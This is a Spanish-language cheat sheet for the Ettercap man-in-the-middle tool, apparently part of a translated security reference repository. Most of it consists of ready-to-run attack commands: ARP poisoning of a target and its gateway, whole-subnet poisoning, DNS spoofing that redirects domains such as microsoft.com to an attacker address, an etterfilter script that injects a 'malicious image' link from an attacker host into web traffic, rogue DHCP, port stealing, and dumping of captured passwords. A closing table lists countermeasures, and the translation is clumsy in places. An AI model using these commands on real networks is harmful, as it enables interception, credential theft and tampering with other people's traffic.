<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Hoja de referencia de Ettercap

[Ettercap](https://www.ettercap-project.org/) es un conjunto completo de ataques de tipo man-in-the-middle (MITM) en redes de área local (LAN). Incluye rastreo de conexiones en vivo, filtrado de contenido sobre la marcha, disección activa y pasiva de muchos protocolos y soporte para envenenamiento de ARP, redirecciones ICMP, suplantación de DHCP y robo de puertos.

---

## Tabla de contenidos

- [Arquitectura principal y modos](#arquitectura-central--modos)
- [Instalación y configuración rápida] (#instalación--configuración rápida)
- [Envenenamiento y olfateo de ARP] (#arp-poisoning--sniffing)
- [Ataques de suplantación de DNS](#dns-spoofing-attacks)
- [Filtrado de paquetes personalizado (`etterfilter`)](#filtrado-de-paquetes-personalizado-etterfilter)
- [Suplantación de DHCP y robo de puertos](#dhcp-spoofing--robo de puertos)
- [Registro y extracción de paquetes] (#logging--packet-extraction)
- [Detección defensiva y contramedidas](#detección-defensiva--contramedidas)

---

## Arquitectura principal y modos

Ettercap admite múltiples modos de ejecución:
- **`-T` (modo texto):** Salida de terminal liviana y sin maldiciones, ideal para secuencias de comandos y automatización sin cabeza.
- **`-C` (modo Curses):** UI de terminal basada en Ncurses para operaciones interactivas sin X11.
- **`-G` (modo GTK):** Interfaz gráfica completa.
- **`-D` (modo Daemon):** Se ejecuta silenciosamente en segundo plano.

Sintaxis de especificación de destino:
```text
/MAC/IPs/IPv6/PORTs
```
- Los objetivos pueden estar separados por comas o rangos de IP: `//` coincide con todo.
- Ejemplo: `/192.168.1.50/` apunta a IP `192.168.1.50` en todos los puertos.
- Ejemplo: `//80,443/` apunta a todos los hosts en los puertos 80 y 443.

---

## Instalación y configuración rápida
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Verifique las ubicaciones de los archivos de configuración:
- `/etc/ettercap/etter.conf`: Configuración de red central y caída de privilegios.
- `/etc/ettercap/etter.dns`: tabla de búsqueda de registros de suplantación de DNS.

---

## Envenenamiento y inhalación de ARP

### 1. Envenenamiento ARP remoto bidireccional
Envenenar tablas ARP entre una estación de trabajo de destino y la puerta de enlace de red:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: Modo texto.
- `-q`: modo silencioso (reduce la detalle, muestra solo las credenciales capturadas).
- `-i eth0`: Interfaz de red de escucha e inyección.
- `-M arp:remote`: Realiza envenenamiento ARP de intermediario bidireccional.

### 2. Rastreo de subred completa (unidireccional/difusión)
Envenene todos los hosts de la subred contra la puerta de enlace predeterminada:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Solo olfateo pasivo
Capture las credenciales en texto sin formato que pasan por el host actual sin suplantación de ARP:
```bash
sudo ettercap -T -q -i eth0
```
---

## Ataques de suplantación de DNS

Ettercap incluye complementos integrados, incluido `dns_spoof`.

### Paso 1: Configurar `/etc/ettercap/etter.dns`
Agregue un comodín o una redirección de dominio específica:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Paso 2: Inicie Ettercap con el complemento DNS
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: Activa el complemento de suplantación de DNS.
- Las consultas DNS interceptadas que coinciden con `etter.dns` devuelven la IP del atacante.

---

## Filtrado de paquetes personalizado (`etterfilter`)

Ettercap permite la inspección de paquetes en tiempo real y la modificación de la carga útil mediante scripts de filtro personalizados.

### 1. Escribir script de filtro (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Compilar filtro con `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Ejecutar con filtro
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## Falsificación de DHCP y robo de puertos

### 1. Ataque al servidor DHCP no autorizado
Responda más rápido que el servidor DHCP legítimo para asignar puertas de enlace y direcciones DNS no autorizadas:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Sintaxis: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Ataque de robo de puertos (inundación de conmutadores/abuso de tablas CAM)
Robar tráfico en redes conmutadas donde se bloquea o alerta el envenenamiento de ARP:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Registro y extracción de paquetes

### Guardar sesiones capturadas sin procesar
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: escribe datos del paquete pcap sin procesar.
- `-L ettercap_log`: escribe registros de texto diseccionados y legibles por humanos.

### Convertir registros binarios con `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Detección defensiva y contramedidas

| Vector | Mecanismo de Detección y Defensa |
|---|---|
| **Suplantación de ARP** | Habilite la inspección dinámica de ARP (DAI) en conmutadores administrados; inspeccione `arp -a` en busca de MAC duplicadas; ejecute `arpwatch` o `arpon`. |
| **Suplantación de DNS** | Aplique DNSSEC, DoH (DNS sobre HTTPS) o DoT (DNS sobre TLS). |
| **Suplantación de DHCP** | Habilite DHCP Snooping en los conmutadores para designar puertos de enlace ascendente confiables. |
| **Robo de Puerto** | Implemente control de acceso a la red (NAC) 802.1X y seguridad de puertos con límites de MAC por puerto de switch. |